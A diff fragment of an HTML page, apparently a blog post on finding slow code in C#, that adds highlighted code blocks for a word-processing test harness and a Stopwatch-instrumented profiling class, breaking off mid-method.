+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">testTaskRunners</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="normal">ITestTask</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span> <span class="special-char">{</span> <span class="decl">new</span> <span class="class">TestTask_Straightforward</span><span class="special-char">(</span><span class="special-char">)</span> <span class="special-char">}</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">runner</span> <span class="normal">in</span> <span class="normal">testTaskRunners</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">selfTestOut</span> <span class="special-char">=</span> <span class="normal">runner</span><span class="special-char">.</span><span class="method">Run</span><span class="special-char">(</span><span class="normal">selfTestIn</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">selfTestOut</span> <span class="special-char">!</span><span class="special-char">=</span> <span class="normal">selfTestOutExpected</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">WriteLine</span><span class="special-char">(</span><span class="string"><span class="special-char">$"</span></span><span class="special-char">{</span><span class="normal">runner</span><span class="special-char">.</span><span class="method">GetType</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="normal">Name</span><span class="special-char">}</span><span class="string">: FAILED<span class="special-char">"</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">continue</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">bigOut</span> <span class="special-char">=</span> <span class="normal">runner</span><span class="special-char">.</span><span class="method">Run</span><span class="special-char">(</span><span class="normal">bigIn</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">WriteLine</span><span class="special-char">(</span><span class="string"><span class="special-char">$"</span></span><span class="special-char">{</span><span class="normal">runner</span><span class="special-char">.</span><span class="method">GetType</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="normal">Name</span><span class="special-char">}</span><span class="string">: </span><span class="special-char">{</span><span class="normal">runner</span><span class="special-char">.</span><span class="normal">ElapsedMilliseconds</span><span class="special-char">}</span><span class="string"> ms<span class="special-char">"</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">Console</span><span class="special-char">.</span><span class="method">ReadKey</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">TestTask_Straightforward</span> <span class="special-char">:</span> <span class="class">ITestTask</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">string</span> <span class="method">Run</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="class">String</span><span class="special-char">.</span><span class="method">IsNullOrEmpty</span><span class="special-char">(</span><span class="normal">input</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">input</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch</span><span class="special-char">.</span><span class="method">Restart</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">input</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">ToLower</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">words</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">Split</span><span class="special-char">(</span><span class="class">Consts</span><span class="special-char">.</span><span class="normal">Separators</span><span class="special-char">,</span> <span class="class">StringSplitOptions</span><span class="special-char">.</span><span class="normal">RemoveEmptyEntries</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">resultWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">words</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">%</span> <span class="normal">2</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="special-char">!</span><span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">result</span> <span class="special-char">=</span> <span class="class">String</span><span class="special-char">.</span><span class="method">Join</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span><span class="special-char">"</span></span><span class="special-char">,</span> <span class="normal">resultWords</span><span class="special-char">.</span><span class="method">OrderBy</span><span class="special-char">(</span><span class="normal">x</span> <span class="special-char">=</span><span class="special-char">&gt;</span> <span class="normal">x</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">result</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">long</span> <span class="normal">ElapsedMilliseconds</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">get</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">_stopwatch</span><span class="special-char">.</span><span class="normal">ElapsedMilliseconds</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                         </div>
                     </div>
                     <div class="block color-bw">
@@ -1963,7 +2119,105 @@
                         <div class="sub-title"><h2>Find what's slow</h2></div>
                         <div>
                             <p><span>As I said, I want to use the code above for self-tests and as a reference, so I will create another class to experiment with. And I need more <code>Stopwatches</code>...</span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">TestTask_Fast</span> <span class="special-char">:</span> <span class="class">ITestTask</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Total</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_ToLower</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Split</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Foreach</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Reverse</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_IsEven</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_ResultContains</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_ResultAdd</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Order</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">Stopwatch</span> <span class="normal">_stopwatch_Join</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">Stopwatch</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">string</span> <span class="method">Run</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Total</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ToLower</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Split</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Foreach</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Reverse</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_IsEven</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultContains</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultAdd</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Order</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Join</span><span class="special-char">.</span><span class="method">Reset</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="class">String</span><span class="special-char">.</span><span class="method">IsNullOrEmpty</span><span class="special-char">(</span><span class="normal">input</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">input</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Total</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ToLower</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">input</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">ToLower</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ToLower</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Split</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">words</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">Split</span><span class="special-char">(</span><span class="class">Consts</span><span class="special-char">.</span><span class="normal">Separators</span><span class="special-char">,</span> <span class="class">StringSplitOptions</span><span class="special-char">.</span><span class="normal">RemoveEmptyEntries</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Split</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">resultWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Foreach</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">words</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_IsEven</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">isEven</span> <span class="special-char">=</span> <span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">%</span> <span class="normal">2</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_IsEven</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">isEven</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultContains</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">isDuplicate</span> <span class="special-char">=</span> <span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultContains</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="special-char">!</span><span class="normal">isDuplicate</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultAdd</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
